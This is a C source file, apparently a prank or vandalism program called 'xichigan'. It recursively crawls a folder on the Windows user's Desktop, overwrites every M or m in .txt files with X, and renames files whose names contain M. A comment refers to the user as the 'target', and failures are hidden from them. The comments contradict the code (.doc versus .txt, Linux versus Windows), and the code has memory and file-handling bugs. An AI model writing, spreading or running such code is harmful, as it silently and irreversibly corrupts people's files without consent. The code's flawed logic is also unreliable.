#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <windows.h>

#define PATH_MAX        4096    /* # chars in a path name including nul */

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* Compile: gcc -o xichigan xichigan.c					 					 					*
*																				 							*
* Functions to search for .doc and .docx files on the desktop                    *
* of the current user, open them, and replace every 'M' or 'm' with 'X'          *
**********************************************************************************/

/*********************************************************************************
Open the .txt file and replace 'M' and 'm' with 'X'
**********************************************************************************/
void convertMtoX(char *filepath){
	FILE *file;
	char ch;

	// Open the file
	file = fopen(filepath, "r+");
	if (!file){
		//fprintf(stderr, "Unable to open file %s", filepath);
		return; // Return with no error to target
	}
	
	while ((ch = fgetc(file)) != EOF){
		// If the current value is an 'M' or 'm', replace it with an 'X'
		if(ch == 'M' || ch == 'm'){
			fseek(file, ftell(file) -1 , SEEK_SET);
			fprintf(file, "%c", 'X');
			fseek(file, ftell(file), SEEK_SET);
		}		
	}
}

/*********************************************************************************
Determine if the filepath 'path' is a directory; return 1 if it is a directory, 
0 otherwise
**********************************************************************************/
int isDir(const char* path) {
    struct stat buf;
    stat(path, &buf);
    return S_ISDIR(buf.st_mode);
}

/*********************************************************************************
Find and replace all 'M's and 'm's in a string with 'X'
Used only to convert filenames
**********************************************************************************/
void findAndReplaceMs(char* str) {
	int i;
	for(i = 0; i <= strlen(str); i++){
  		if(str[i] == 'M' || str[i] == 'm')  
		{
  			str[i] = 'X';
 		}
	}
}

/*********************************************************************************
Search (spider) through all of the files on the Desktop and any subdirectories
**********************************************************************************/
void spiderDirectory(char *homeDir, DIR *d){
	struct dirent *dir;
	DIR *currentD;
	char *currentDir = malloc(PATH_MAX);
	int length;
	char* newFileNaXe = malloc(PATH_MAX);
	char* newFilePath = malloc(PATH_MAX);

	// Loop and recurse until there are no more subdirectories
	while ((dir = readdir(d)) != NULL){
		// Get the full path associated with dir->d_name
		strcpy(currentDir, homeDir);
		strcat(currentDir,"\\");
		strcat(currentDir,dir->d_name);
		
		// If the current element of the directory is a subdirectory (and not . or ..), spider through it
		if(strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && isDir(currentDir)){
			currentD = opendir(currentDir);
			if (currentD){
				spiderDirectory(currentDir, currentD);
				closedir(currentD);
			}
		}

		/*
			If the current item in the directory is a .txt, convert all Ms to Xs
		*/
		length = strlen(currentDir);
		if(length > 4 && strcmp(&currentDir[length-4],".txt") == 0){ 
			convertMtoX(currentDir);
		}

		/*
			If the current item's name contains an m or M, change the name of the file by replacing with Xs
		*/
		if(strchr(dir->d_name, 'M') != NULL || strchr(dir->d_name, 'm') != NULL){
			// Get the new file name
			strcpy(newFileNaXe, dir->d_name);
			printf("%s\n", newFileNaXe);
			findAndReplaceMs(newFileNaXe);
			// Construct a new valid filepath with the converted name
			strcpy(newFilePath, homeDir);
			strcat(newFilePath, "\\");
			strcat(newFilePath, newFileNaXe);
			printf("%s\n", newFilePath);

			// Rename the file
			rename(currentDir, newFilePath);
		}

	}

}

/*********************************************************************************
Main Function
**********************************************************************************/
int main(int argc, char*argv[]) {
	DIR *d;
	char *homedir = getenv("USERPROFILE");
	// Get the Desktop path if user is using Linux
	strcat(homedir,"\\Desktop\\testFolder");

	// TODO: Get Desktop path if user is using Windows/iOS
	// Look through the desktop and all of its subdirectories for word documents, and do the conversion XtoM
	d = opendir(homedir);
	if (d){
		spiderDirectory(homedir, d);
		closedir(d);
	}

}
